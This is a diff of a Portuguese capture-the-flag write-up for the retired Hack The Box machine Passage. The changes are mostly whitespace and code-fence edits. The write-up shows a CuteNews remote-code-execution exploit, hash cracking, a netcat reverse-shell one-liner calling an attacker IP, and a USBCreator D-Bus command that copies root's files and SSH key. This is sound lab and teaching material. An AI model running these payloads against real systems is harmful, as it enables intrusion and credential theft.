@@ -13,7 +13,7 @@ header:
 
 Olá pessoal!
 
-A máquina desta semana será Passage, outra máquina Linux classificada como mediana do Hack The Box criada por [ChefByzen](https://www.hackthebox.eu/home/users/profile/140851). 
+A máquina desta semana será Passage, outra máquina Linux classificada como mediana do Hack The Box criada por [ChefByzen](https://www.hackthebox.eu/home/users/profile/140851).
 
 :information_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas
 {: .notice--info}
@@ -46,11 +46,11 @@ Nmap done: 1 IP address (1 host up) scanned in 10.65 seconds
 
 ### 80/TCP - Serviço HTTP
 
-Acessando a página notado que se trata de um blog criado com **[CuteNews](http://cutephp.com/)** e o primeiro post continha algo bastante interessante, mencionando que Fail2Ban foi recentemente implementado no site. Isso irá nos impedir de utilizar qualquer ferramenta de enumeração que utilize brute force (como dirbuster e outras ferramentas/técnicas relacionadas). 
+Acessando a página notado que se trata de um blog criado com **[CuteNews](http://cutephp.com/)** e o primeiro post continha algo bastante interessante, mencionando que Fail2Ban foi recentemente implementado no site. Isso irá nos impedir de utilizar qualquer ferramenta de enumeração que utilize brute force (como dirbuster e outras ferramentas/técnicas relacionadas).
 
 ![image-20210225141945974](https://i.imgur.com/XLBq0J7.png){: .align-center}
 
-Inspecionando o código fonte da página, enquanto buscava por links interessantes, encontrei alguns endereços e-mail, além do domínio **passage.htb**, o qual foi adicionado na sequência no arquivo hosts local. 
+Inspecionando o código fonte da página, enquanto buscava por links interessantes, encontrei alguns endereços e-mail, além do domínio **passage.htb**, o qual foi adicionado na sequência no arquivo hosts local.
 
 ```bash
 $ curl -L http://10.10.10.206 | grep -Eo 'href="(.*)"' | grep -v 'index.php' | sort -u
@@ -67,16 +67,16 @@ href="mailto:paul@passage.htb"
 href="mailto:sid@example.com"
 ```
 
-Após alguma pesquisa sobre o produto, encontrei a página de administração em `http://passage.htb/CuteNews`, onde pude identificar a versão em execução **2.1.2**. 
+Após alguma pesquisa sobre o produto, encontrei a página de administração em `http://passage.htb/CuteNews`, onde pude identificar a versão em execução **2.1.2**.
 
 ![image-20210225154213926](https://i.imgur.com/cYxMtVe.png){: .align-center}
 
 ## Acesso inicial
 
-Verificando os exploits existentes para esta versão do produto, encontrei 4 alternativas usando o `searchsploit` onde acabei utilizando a versão **48800**, na qual fiz alguns ajustes posteriormente. 
+Verificando os exploits existentes para esta versão do produto, encontrei 4 alternativas usando o `searchsploit` onde acabei utilizando a versão **48800**, na qual fiz alguns ajustes posteriormente.
 
-```
-$ searchsploit cutenews 2.1.2
+```bash
+searchsploit cutenews 2.1.2
 ---------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                        |  Path
 ---------------------------------------------------------------------- ---------------------------------
@@ -88,9 +88,9 @@ CuteNews 2.1.2 - Remote Code Execution                                | php/weba
 Shellcodes: No Results
 ```
 
-A partir da execução deste exploit não apenas pude obter uma execução remota de código mas também um dump dos hashes das senhas do portal. 
+A partir da execução deste exploit não apenas pude obter uma execução remota de código mas também um dump dos hashes das senhas do portal.
 
-```
+```bash
 $ python3 48800.py
 
 
@@ -138,9 +138,9 @@ Dropping to a SHELL
 command > 
 ```
 
-Crackeando os hashes utilizando John, encontrei a senha **atlanta1**, que pertence ao usuário **paul**, o qual foi identificado após a edição do script Python conforme abaixo. 
+Crackeando os hashes utilizando John, encontrei a senha **atlanta1**, que pertence ao usuário **paul**, o qual foi identificado após a edição do script Python conforme abaixo.
 
-```
+```bash
 Enter the URL> http://passage.htb
 ================================================================
 Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
@@ -162,17 +162,15 @@ Use the "--show --format=Raw-SHA256" options to display all of the cracked passw
 Session completed
 ```
 
-Além da credencial, obtive um shell reverso interativo com a conta **www-data** a partir do envio do payload a seguir: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f`. 
+Além da credencial, obtive um shell reverso interativo com a conta **www-data** a partir do envio do payload a seguir: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f`.
 
 ## User flag
-
-### Enumeração 
 
 Após executar o script `linpeas.sh`, encontrei alguns itens interessantes:
 
 - Máquina é vulnerável a USBCreator
 
-  ```
+  ```bash
   [+] USBCreator
   [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation
   Vulnerable!!
@@ -188,21 +186,20 @@ Após executar o script `linpeas.sh`, encontrei alguns itens interessantes:
 
 - Observado 2 usuários na máquina, que inicialmente foram listados quando encontrei os endereços de e-mail e, para o usuário Paul, já temos uma possível senha.
 
-  ```
+  ```bash
   [+] Users with console
   nadav:x:1000:1000:Nadav,,,:/home/nadav:/bin/bash
   paul:x:1001:1001:Paul Coles,,,:/home/paul:/bin/bash
   root:x:0:0:root:/root:/bin/bash
   ```
 
-- Permissões para os usuários de console listados, onde **nadav** é o que possui mais privilégios na máquina, sendo inclusive membro do grupo **sudo**. 
+- Permissões para os usuários de console listados, onde **nadav** é o que possui mais privilégios na máquina, sendo inclusive membro do grupo **sudo**.
 
-  ```
+  ```bash
   [+] All users & groups
   uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
   uid=1001(paul) gid=1001(paul) groups=1001(paul)
   ```
-  
 
 Primeira coisa a ser testada a seguir foram as credenciais do usuário Paul, que funcionaram com sucesso na primeira tentativa e nos permitiram obter a flag de usuário! :smile:
 
@@ -217,7 +214,7 @@ paul@passage:~$ cat user.txt
 
 Ao obter a conta do usuário *paul*, foi testada novamente a exploração do USB-Creator, porém falhou do mesmo modo que o usuário www-data devido a privilégios insuficientes.
 
-Analisando o diretório raiz do usuário, encontado um par de chaves RSA, a qual está inclusa no arquivo `authorized_keys` para conexão ssh sem credenciais. 
+Analisando o diretório raiz do usuário, encontado um par de chaves RSA, a qual está inclusa no arquivo `authorized_keys` para conexão ssh sem credenciais.
 
 ```bash
 paul@passage:~/.ssh$ ls -la
@@ -241,9 +238,10 @@ Last login: Thu Feb 25 13:41:27 2021 from 10.10.10.10
 nadav@passage:~$ id
 uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
 ```
-Finalmente, como o usuário **nadav**, fiz uma última tentativa da exploração da vulnerabilidade do USBCreator. Desta vez tivemos sucesso, uma vez que este usuário possui diversos privilégios nesta máquina. 
 
-O exploit do USBCreator nos permite copiar um arquivo usando os privilégios de root. Se quiser apenas copiar o arquivo `root.txt` para o diretório `/tmp`, a linha de comando abaixo atende a esta necessidade. 
+Finalmente, como o usuário **nadav**, fiz uma última tentativa da exploração da vulnerabilidade do USBCreator. Desta vez tivemos sucesso, uma vez que este usuário possui diversos privilégios nesta máquina.
+
+O exploit do USBCreator nos permite copiar um arquivo usando os privilégios de root. Se quiser apenas copiar o arquivo `root.txt` para o diretório `/tmp`, a linha de comando abaixo atende a esta necessidade.
 
 ```bash
 nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/somefilename true
@@ -252,7 +250,7 @@ nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path 
 Porém, se quiser um shell interativo com privilégios de root, existem algumas possibilidades que devemos tentar:
 
 - Obter uma cópia do `/etc/shadow`, fazer o unshadow e crackear a senha utilizando John ou Hashcat, o que não funcionou com o dicionário que utilizei;
-- Verificar a existência de um arquivo `id_rsa` no perfil do root, assim como sua configuração como uma chave autorizada no arquivo **authorized_keys**, que foi onde obtivemos sucesso e pudemos ver a flag desta conta. 
+- Verificar a existência de um arquivo `id_rsa` no perfil do root, assim como sua configuração como uma chave autorizada no arquivo **authorized_keys**, que foi onde obtivemos sucesso e pudemos ver a flag desta conta.
 
 ```bash
 nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/somefilename true
@@ -267,6 +265,6 @@ root@passage:~# cat /root/root.txt
 <redacted>
 ```
 
-Espero que tenham gostado. 
+Espero que tenham gostado.
 
 Até o próximo post! :smiley:
